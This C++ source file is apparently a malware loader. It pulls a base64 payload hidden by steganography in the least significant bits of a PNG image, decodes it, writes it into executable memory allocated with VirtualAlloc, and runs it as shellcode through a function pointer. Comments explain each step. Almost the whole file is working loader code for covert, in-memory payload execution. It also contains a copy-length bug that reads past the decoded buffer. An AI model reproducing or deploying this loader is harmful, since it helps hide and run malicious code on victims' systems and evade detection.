#include <iostream>
#include <vector>
#include <string>
#include <windows.h>
#include "lodepng.h"
#include "extract.h"
#include "base64.h"

int main() {
	std::vector<unsigned char> image;
	unsigned width, height;

	unsigned error = lodepng::decode(image, width, height, "stego_output.png");
	if (error) {
		std::cerr << "Error loading PNG: " << lodepng_error_text(error) << "\n";
		system("pause");
		return 1;
	}

	std::cout << "Loaded image: " << width << "x" << height << "\n";
	int bitLength = (396 + 8) * 8;  // header + payload
	// create bitstring from LSBs of the image
	std::string bitstring = extract::extract_bitstring_from_lsb(image, bitLength);

	// bitstring to byte conversion
	std::vector<uint8_t> byteData = extract::bitstring_to_bytes(bitstring);
	std::cout << "Extracted " << byteData.size() << " bytes from the image\n";
	// Look for "STEG" header
	if (byteData.size() < 8) {
		std::cerr << "Data too short to contain header\n";
		system("pause");
		return 1;
	}

	// Check for "STEG" marker
	if (!extract::is_valid_steg_marker(byteData)) {
		std::cerr << "Missing or invalid STEG marker\n";
		system("pause");
		return 1;
	}

	int payloadLength = extract::get_payload_length(byteData);
	std::cout << "Payload Length: " << payloadLength << "\n";

	// Check if the payload length is valid
	if (byteData.size() < 8 + payloadLength) {
		std::cerr << "Incomplete payload data\n";
		system("pause");
		return 1;
	}

	// Extract Base64 payload
	std::string base64Payload = extract::extract_base64_string(byteData, payloadLength); // Declare base64Payload as a string
	std::cout << "Base64 Payload: " << base64Payload << "\n";
	std::string decoded = base64_decode(base64Payload); // base64Payload is a std::string

	LPVOID lpAddress = VirtualAlloc(NULL, payloadLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAddress == NULL) {
		std::cerr << "Memory allocation failed: " << GetLastError() << "\n";
		system("pause");
		return 1;
	}
	// Copy the Base64 payload to the allocated memory
	memcpy(lpAddress, decoded.data(), payloadLength);
	// Execute the payload
	typedef void (*FunctionPointer)(); // Define a function pointer type that matches the signature of the shellcode.


	// We cast the raw memory address (e.g., from VirtualAlloc) to a function pointer.
	// This allows us to treat the shellcode as a callable function and execute it directly.
	// C++ doesn't allow jumping to arbitrary memory, but reinterpret_cast tells the compiler:
	// "Trust me, this memory holds a function – just call it."

	FunctionPointer func = reinterpret_cast<FunctionPointer>(lpAddress);

	// Call the function pointer to execute the shellcode
	func();
	// Free the allocated memory
	VirtualFree(lpAddress, 0, MEM_RELEASE);
	system("pause");
	return 0;
}
